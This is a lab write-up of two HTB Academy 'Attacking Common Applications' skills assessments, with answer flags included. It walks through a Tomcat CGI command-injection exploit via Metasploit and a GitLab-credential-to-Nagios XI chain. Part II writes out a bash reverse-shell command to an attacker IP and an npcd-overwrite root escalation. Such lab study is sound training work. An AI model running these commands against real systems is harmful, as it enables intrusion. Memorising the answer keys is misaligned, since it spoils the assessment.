# Attacking Common Applications — Skills Assessments

HTB Academy "Attacking Common Applications" module, Sections 31–33 (three skills assessments).

---

## Skills Assessment I — Tomcat CGI RCE (CVE-2019-0232)

**Target:** 10.129.49.223 (ACADEMY-ATCKAPPS-SKILLS1, hostname APPS-SKILLS1), Windows Server 2019.

**Goal:** Enumerate, identify a vulnerable app, get a foothold, read `flag.txt` on the Administrator desktop.

### Answers
- Q1 vulnerable application: **Tomcat**
- Q2 port: **8080**
- Q3 version: **9.0.0.M1**
- Q4 flag: **f55763d31a8f63ec935abd07aee5d3d0**

### Enumeration
`nmap -p- -sC -sV --open --min-rate=1000 10.129.49.223 -v`:
- 21 FTP — **anonymous allowed**, root has `website_backup/`
- 80/443 IIS 10.0 ("Freight Logistics, Inc")
- 135/139/445 SMB, 3389 RDP, 5985 WinRM
- 8000 → **Jenkins 2.303.1** (Jetty; auth required)
- 8009 → AJP13
- **8080 → Apache Tomcat 9.0.0.M1** (`http-title: Apache Tomcat/9.0.0.M1`)

Fingerprint the web apps:
```
curl -s -i http://10.129.49.223:8080/ | head -30   # Tomcat 9.0.0.M1
curl -s -i http://10.129.49.223:8000/ | head -20   # X-Jenkins: 2.303.1, 403 auth required
```

### Dead Ends (documented so we don't repeat)
- **FTP `website_backup`** — pulled it all with `wget -r "ftp://anonymous:anonymous@10.129.49.223/" -P ftp_loot`. It's just the static site template (HTML/CSS/JS/flag SVGs). Grep for creds found nothing. Red herring for credentials.
- **Tomcat Manager** — `/manager/html` returns **404** (app not deployed) → no WAR-upload path.
- **Jenkins** — needs auth, no creds in hand.

### Identifying the Vuln
- Windows + **Tomcat 9.0.0.M1** = exact affected range for **CVE-2019-0232** (Tomcat CGI Servlet OS command injection, `enableCmdLineArguments=true`). Range: 9.0.0.M1–9.0.17, 8.5.0–8.5.39, 7.0.0–7.0.93. (Module Section 19.)

### Finding the CGI Script — key gotcha
- `/cgi-bin/` → **404**. The CGI servlet here is mapped at **`/cgi/`** (same as the Section 19 lab).
- `welcome.bat` (the Section 19 name) → 404 here. Fuzz for the real name:
```
ffuf -w /usr/share/dirb/wordlists/common.txt -u http://10.129.49.223:8080/cgi/FUZZ.bat -mc 200
```
- Result: **`cmd`** → `/cgi/cmd.bat` returns 200 (Size 0).

### Exploitation — Metasploit
Module: `exploit/windows/http/tomcat_cgi_cmdlineargs` (CVE-2019-0232).
```
msfconsole -q -x "use exploit/windows/http/tomcat_cgi_cmdlineargs; set RHOSTS 10.129.49.223; set RPORT 8080; set TARGETURI /cgi/cmd.bat; set LHOST tun0; set LPORT 4445; set ForceExploit true; run"
```
- **Critical gotcha:** the module's AutoCheck reports "**target is not exploitable**" — a **false negative**, because `cmd.bat` returns an empty body so the check can't see command output. The injection still works. A manual `curl ".../cgi/cmd.bat?&c%3A%5C...%5Cwhoami.exe"` also returned an empty body for the same reason.
- **`set ForceExploit true`** bypasses the bad check. A reverse-shell payload calls back on its own and doesn't need visible output → session opened.
- Landed in `C:\Program Files\Apache Software Foundation\Tomcat 9.0\webapps\ROOT\WEB-INF\cgi`.

### Post-Exploitation
```
getuid   # NT AUTHORITY\SYSTEM  (Tomcat runs as SYSTEM — no privesc needed)
cat C:\\Users\\Administrator\\Desktop\\flag.txt   # f55763d31a8f63ec935abd07aee5d3d0
```

### Lessons Learned
- When a target has multiple module apps (Tomcat, Jenkins), let the **available attack surface** decide: Manager 404 + Jenkins-auth-required eliminated those paths and pointed at the CGI CVE.
- **CGI path varies** — the servlet may be at `/cgi/`, not `/cgi-bin/`. Always confirm the directory, then fuzz for the `.bat`/`.cmd` script name.
- **Trust a reverse-shell over a scanner's "not vulnerable"** when the check depends on reading output. `ForceExploit true` is the right call once you understand *why* the check failed (empty CGI body).
- Anonymous-FTP backups are worth checking but are often just static site content — grep, confirm, move on.

---

## Skills Assessment II — GitLab (internal repo) → Nagios XI RCE

**Target:** 10.129.201.90 (ACADEMY-ATCKAPPS-SKILLS2, hostname `skills2`), Ubuntu 20.04.

**Scenario:** an "uninteresting" host; a note points back at the `gitlab.inlanefreight.local` vhost. Iterative enumeration reveals the chain.

### Answers
- Q1 WordPress URL: **http://blog.inlanefreight.local** (no trailing slash)
- Q2 public GitLab project: **Virtualhost**
- Q3 third vhost FQDN: **monitoring.inlanefreight.local**
- Q4 app on third vhost: **Nagios** (Nagios XI)
- Q5 admin password: **oilaKglm7M09@CPL&^lC** (user `nagiosadmin`)
- Q6 flag.txt: **afe377683dce373ec2bf7eaf1e0107eb**

### Enumeration
`nmap -p- -sC -sV --open --min-rate=1000 -oA skills2_full 10.129.201.90`:
- 22 SSH, 25 Postfix (VRFY on), 389 OpenLDAP
- **80** Apache 2.4.41 → 302 redirect to `http://gitlab.inlanefreight.local:8180/`
- **443** Apache 2.4.41 (SSL) — title *"Shipter – Transport and Logistics HTML5 Template"*; **ssl-cert org = "Nagios Enterprises"** (tell)
- **5667** NSCA (Nagios Service Check Acceptor) — confirms Nagios present
- 8060 nginx 1.18.0 (404 on IP → vhost-routed), **8180 nginx = GitLab** (502 while booting, then up), 9094 misc

### vhost discovery — the simple way vs. the trap
- **Simple/intended:** the default site links to the blog:
  `curl -s http://10.129.201.90/ | grep .local` → `<a href="http://blog.inlanefreight.local/">Employee Blog</a>`.
  Or fuzz on **HTTP**: `ffuf -w .../subdomains-top1million-5000.txt:FUZZ -u http://FUZZ.inlanefreight.local/` → `blog` (Size 50114).
- **Trap I hit:** tried to vhost-fuzz **443** with `-H "Host: FUZZ"` against the IP → all responses came back as the default Shipter page (46166 bytes), *including* `monitoring`. **Root cause: port 443 is virtual-hosted by TLS SNI, not the HTTP Host header.** `-H Host:` against the IP keeps SNI = default, so named TLS vhosts are unreachable that way. Fix: connect to the *hostname* (curl sets SNI) or fuzz on plain HTTP (port 80) where Host-header routing works.

### GitLab — the crux
- Public project at `/explore`: **`Administrator / Virtualhost`** (Q2). Its README usage example was edited (commit `bb8b11ca`, by *Administrator*) to `virtualhost create monitoring.inlanefreight.local` → reveals **Q3** (`monitoring.inlanefreight.local`).
- Q4 = **Nagios**: SSL cert "Nagios Enterprises" + NSCA/5667; the Nagios logo is on the login page.
- **Q5 password — the part anonymous enum could NOT see.** I swept all 61 commits (every author) and public snippets/blob-search — **zero credentials**. The password is in a **second repo that is only visible to authenticated GitLab users** (GitLab default project visibility = *Internal*).
  - Fix: **register an account** at `/users/sign_up`, log in, then `/dashboard/projects` (or `/explore/projects`) now lists **`Administrator / Nagios Postgresql`**.
  - That repo's setup SQL contains: `CREATE USER nagiosadmin WITH PASSWORD 'oilaKglm7M09@CPL&^lC';` → **Q5**.

### Foothold — Nagios XI Core Config Manager RCE (Q6)
- Nagios XI is **not at `/`** (root serves the Shipter decoy template) — it's at **`https://monitoring.inlanefreight.local/nagiosxi/`**. Log in `nagiosadmin:oilaKglm7M09@CPL&^lC`.
- **Configure → Core Config Manager → Commands → Add New** with command line:
  `bash -c 'bash -i >& /dev/tcp/10.10.15.112/4444 0>&1'`
- Create/assign a **Service** using that command as its check command, **Apply Configuration** / Run Check Command → shell as `nagios` on `nc -lnvp 4444`.
- Flag (uniquely named in the webroot — always `find`/`ls` first):
  `find / -name '*flag*' 2>/dev/null | grep -i txt` → `/usr/local/nagiosxi/html/admin/f5088a862528cbb16b4e253f1809882c_flag.txt` → **afe377683dce373ec2bf7eaf1e0107eb**.

### Root privesc (optional, beyond the flag)
- `sudo -l` as `nagios` allows `/usr/local/nagiosxi/scripts/manage_services.sh *` and control of `npcd`. Overwrite `/usr/local/nagios/bin/npcd` with a bash reverse shell, `sudo manage_services.sh stop npcd` then `start npcd` → shell as **root**.

### Lessons Learned
- **GitLab anonymous ≠ complete.** Anonymous enumeration only returns *public* projects/snippets. GitLab's default visibility is **Internal** — visible to *any registered user*. When a repo is provided but shows no creds, **register and re-enumerate** before ever considering brute force. (A provided repo + a login-brute path do not coexist in a well-designed box.)
- **443 vhosts route by SNI, not Host header** — fuzz named TLS vhosts via the hostname (SNI) or on plain HTTP; `-H Host:` against the IP silently returns the default vhost.
- **The obvious app may be a distractor.** WordPress (blog) had a single `admin` user and no vulnerable plugin — it was bait for a brute-force rabbit hole; the real path was GitLab→Nagios.
- **Apps hide behind decoy roots.** `monitoring/` served a static template; the real Nagios XI was under `/nagiosxi/`. Check known app subpaths, not just `/`.
- Credentials are often **unlabeled** (a Postgres `CREATE USER` line) — label-based greps miss them; read the actual files.
